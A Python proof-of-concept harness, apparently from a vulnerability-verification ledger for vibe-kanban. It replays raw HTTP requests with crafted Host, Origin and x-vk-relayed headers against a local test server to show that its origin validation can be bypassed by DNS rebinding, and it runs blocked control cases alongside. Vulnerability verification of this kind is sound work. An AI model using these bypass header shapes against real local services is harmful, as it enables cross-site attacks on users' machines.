#!/usr/bin/env python3
"""V2 origin-bypass differential replay (vibe-kanban ledger #106).

Starts the harness (real origin.rs + real ValidateRequestHeaderLayer wiring),
then replays attacker-shaped and control-shaped HTTP requests over raw
sockets — byte-level control over Host/Origin/x-vk-relayed, which is exactly
the degree of freedom a DNS-rebinding attacker has.

Header shapes and what they model in a DNS-rebinding attack (attacker domain
`rebind.attacker.test` re-resolves to 127.0.0.1 while the page is loaded):

  A  no Origin header           browser same-origin GET / top-level navigation
  B  Origin == Host (same port) browser same-origin POST/PUT/WS handshake
                                    after same-port rebinding
  B2 Origin == Host, mixed case quick string match at origin.rs:59 fails,
                                    the OriginKey path at :74-79 accepts
  C  x-vk-relayed: 1            NOT browser-settable; models any local
                                    unprivileged process (headers fully
                                    attacker-controlled)
  K1 honest cross-origin Origin models a cross-origin fetch from any normal
                                    website (the attack origin.rs was built for)
  K2 Origin: null               sandboxed iframe / data: URL origin
  K3 Origin host:80 vs Host:41783  cross-PORT rebinding shape (port mismatch)
"""
import socket
import subprocess
import sys
import time

ROOT = "/home/azidan/AQL/AI/AITinkerers"
BIN = f"{ROOT}/scratch/verify/vibe-kanban-V2/target/debug/vk-origin-replay"
PORT = 41783

VULN_SHAPES = [
    ("A_NO_ORIGIN", {"Host": f"127.0.0.1:{PORT}"}, True),
    ("B_ORIGIN_EQ_HOST",
     {"Host": f"rebind.attacker.test:{PORT}",
      "Origin": f"http://rebind.attacker.test:{PORT}"}, True),
    ("B2_ORIGIN_EQ_HOST_KEYPATH",
     {"Host": f"rebind.attacker.test:{PORT}",
      "Origin": f"http://REBIND.ATTACKER.TEST:{PORT}"}, True),
    ("C_RELAY_HEADER_SKIP",
     {"Host": f"127.0.0.1:{PORT}",
      "Origin": "http://evil.example",
      "x-vk-relayed": "1"}, True),
]

CONTROL_SHAPES = [
    ("K1_CROSS_ORIGIN",
     {"Host": f"127.0.0.1:{PORT}", "Origin": "http://evil.example"}, False),
    ("K2_NULL_ORIGIN",
     {"Host": f"127.0.0.1:{PORT}", "Origin": "null"}, False),
    ("K3_CROSS_PORT_REBIND",
     {"Host": f"rebind.attacker.test:{PORT}",
      "Origin": "http://rebind.attacker.test"}, False),
]


def raw_get(headers):
    """One GET /api/probe with exactly the given headers, over a raw socket."""
    lines = [f"GET /api/probe HTTP/1.1"]
    for name, value in headers.items():
        lines.append(f"{name}: {value}")
    lines.append("Connection: close")
    request = ("\r\n".join(lines) + "\r\n\r\n").encode()

    with socket.create_connection(("127.0.0.1", PORT), timeout=5) as s:
        s.sendall(request)
        chunks = []
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
    response = b"".join(chunks).decode("utf-8", "replace")
    status = int(response.split(" ", 2)[1])
    body_reached = "PROBE_OK" in response
    return status, body_reached


def start_server():
    proc = subprocess.Popen(
        [BIN, str(PORT)],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    deadline = time.time() + 15
    while time.time() < deadline:
        line = proc.stdout.readline()
        if "READY" in line:
            return proc
        if proc.poll() is not None:
            sys.exit(f"harness exited early: {line}")
    proc.kill()
    sys.exit("harness never reported READY")


def run(shapes, mode):
    proc = start_server()
    try:
        ok = 0
        for name, headers, expect_bypass in shapes:
            status, body_reached = raw_get(headers)
            bypassed = status == 200 and body_reached
            blocked = status == 403
            verdict = ("BYPASSED" if bypassed else
                       "BLOCKED" if blocked else "UNEXPECTED")
            line = (f"SHAPE {name} status={status} "
                    f"handler_reached={int(body_reached)} verdict={verdict}")
            print(line)
            if expect_bypass and bypassed:
                ok += 1
            elif not expect_bypass and blocked:
                ok += 1
    finally:
        proc.terminate()
        proc.wait(timeout=5)

    total = len(shapes)
    if mode == "vuln":
        print(f"VULN_EFFECT=observed ({ok}/{total} attacker-shaped requests "
              f"reached the handler past validate_origin)")
        return 0 if ok == total else 1
    print(f"CONTROL_EFFECT=blocked ({ok}/{total} control requests rejected "
          f"by validate_origin with 403)")
    return 0 if ok == total else 1


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "vuln"
    shapes = VULN_SHAPES if mode == "vuln" else CONTROL_SHAPES
    sys.exit(run(shapes, mode))
